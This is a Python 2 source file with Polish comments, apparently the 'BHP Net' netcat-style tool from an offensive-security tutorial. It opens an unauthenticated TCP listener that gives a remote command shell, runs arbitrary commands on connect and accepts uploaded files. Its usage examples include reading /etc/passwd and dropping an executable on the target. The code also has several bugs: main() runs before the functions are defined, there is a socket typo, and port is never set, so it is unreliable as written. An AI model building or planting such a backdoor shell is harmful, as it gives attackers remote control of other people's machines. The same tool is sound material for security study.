import sys 
import socket
import getopt
import threading
import subprocess

# definicje kilku zmiennych globalnych
listen                = False
command               = False
upload                = False
execute               = ""
target                = ""
upload_destination    = 0 

def usage():
    print "Narzedzie BHP Net"
    print
    print "Sposob urzycia: bhpnet.py -t target host -p port"
    print "-l --listen               - nasluchiwanie na [host]:[port] polaczen przychodzacych"
    print "-e --execute=file_to_run  - wykonuje dany plik, gdy odbierze polaczenie"
    print "-c --command              - inicjuje wiersz polecen"
    print "-u --upload=destination   - gdy odborze polacznie, wysyala plik i zapisuje go w [destination]"
    print
    print
    print "Przyklady"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "phpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)
    
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
        
    # odczyt opcji wiersza polecen
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
        ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
        
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Nieobslugiwana opcja"
            
    # bedziemy nasluchiwac czy tylko wysylac dane ze stdin?
    if not listen and len(target) and port > 0:
        
        # wczytuje bufor z wiersza polecen
        # to powoduje blokade, wiec wyslij CTRL-D, gdy nie wysylasz danych do stdin
        buffer = sys.stdin.read()
        
        # wysyla dane
        client_sender(buffer)
        
    # bedziemy nasluchiwac i ewentualnie cos wyslac, wykonywac polecania oraz wlaczyc
    # powloke w zaleznosci od opcji wiersza polecen
    if listen:
        server_loop()
        
main()

def client_sender(buffer):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # polaczenie sie z docelowym hostem
        client.connect((target,port))
        
        if len(buffer):
            client.send(buffer)
        while True:
            
            # czekanie na zwrot danych
            recv_len = 1
            response = ""
            
            while recv_len:
                
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                
                if recv_len < 4096:
                    break
            
            print response, 
            
            # czekanie na wiecej danych
            buffer = raw_input("")
            buffer += "\n"
            
            # wysylanie danych
            client.send(buffer)
            
    except:
            
            print"[*] Wyjatek! Zamykanie."
            
            # zamkniecie polaczenia
            client.close()
            
def server_loop():
    global target
    
    # Jesli nie zdefiniowano celu, nasluchujemy na wszystkich interfejsach
    if not len(target):
        target = "0.0.0.0"
        
    server = socket.socket(socket.AF_INET, socket.SOCK.STREAM)
    server.bind((target,port))
    server.listen(5)
    
    while True:
        client_socket, addr = server.accept()
        
        # watek do obslugi naszego nowego klienta
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()
        
def run_command(command):
    
    # odciecie znaku nowego wiersza
    command = command.rstrip()
    
    # wykonywanie polecenia i odebranie wyniku
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Nie udalo sie wykonac polecenia.\r\n"
        
    # wysylanie wyniku do klienta 
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command
    
    # sprawdzanie czy cos zostalo wyslane 
    if len(upload_destination):
        
        # wczytywanie wszystkich bajtow i zapis ich w miejscu docelowym 
        file_buffer = ""
        
        # wczytywanie danych do konca
        while True:
            data = client_socket.recv(1024)
            
            if not data:
                break
            else:
                file_buffer += data 
                
        # proba zapisania wczytanych bajtow
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            # potwierdzenie zapisania pliku
            client_socket.send("Zapisano plik w %s\r\n" % upload_destination)
        except:
            client_socket.send("Nie udalo sie zapisac pliku w %s\r\n" % upload_destination)
            
    # sprawdzanie czy polecanie zostalo wykonane 
    if len(execute):
        
        # wykonywanie polecenia 
        output= run_command(execute)
        
        client_socket.send(output)
        
    # jezeli zazadano wiersza polecen, przechodzimy do innej petli
    if command:
        
        while True:
            # wyswietlanie prostego wiersza polecen
            client_socket.send("<BHP>:#> ")
            
            # pobieramy tekst do napotkania zanku nowego wiersza(Nacisniecie klawisza ENTER)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                
            # odeslanie wyniku polecenia
            response = run_command(cmd_buffer)
            
            # odeslanie odpowiedzi
            client_socket.send(response)
        
        
        
        
        
        